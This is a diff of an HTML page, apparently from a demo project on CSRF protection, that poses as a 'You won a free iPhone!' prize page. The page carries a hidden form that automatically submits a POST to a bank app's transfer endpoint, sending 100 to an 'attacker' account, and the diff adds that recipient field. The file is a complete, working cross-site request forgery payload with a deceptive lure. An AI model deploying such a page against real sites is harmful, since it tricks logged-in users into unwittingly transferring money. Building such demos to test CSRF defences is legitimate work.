@@ -1,21 +1,25 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head>
-  <title>Free Gift 🎁</title>
-</head>
+  <head>
+    <title>Free Gift 🎁</title>
+  </head>
 
-<body>
-  <h1>🎉 You won a free iPhone!</h1>
-  <p>Redirecting...</p>
+  <body>
+    <h1>🎉 You won a free iPhone!</h1>
+    <p>Redirecting...</p>
 
-  <!-- CSRF Attack Form -->
-  <form id="attackForm" action="https://bank-app-for-csrf-attack-protection.onrender.com/bank/transfer" method="POST">
-    <input type="hidden" name="amount" value="100">
-  </form>
+    <!-- CSRF Attack Form -->
+    <form
+      id="attackForm"
+      action="https://bank-app-for-csrf-attack-protection.onrender.com/bank/transfer"
+      method="POST"
+    >
+      <input type="hidden" name="amount" value="100" />
+      <input type="hidden" name="to" value="attacker" />
+    </form>
 
-  <script>
-    // Auto submit attack
-    document.getElementById("attackForm").submit();
-  </script>
-</body>
+    <script>
+      document.getElementById("attackForm").submit();
+    </script>
+  </body>
 </html>
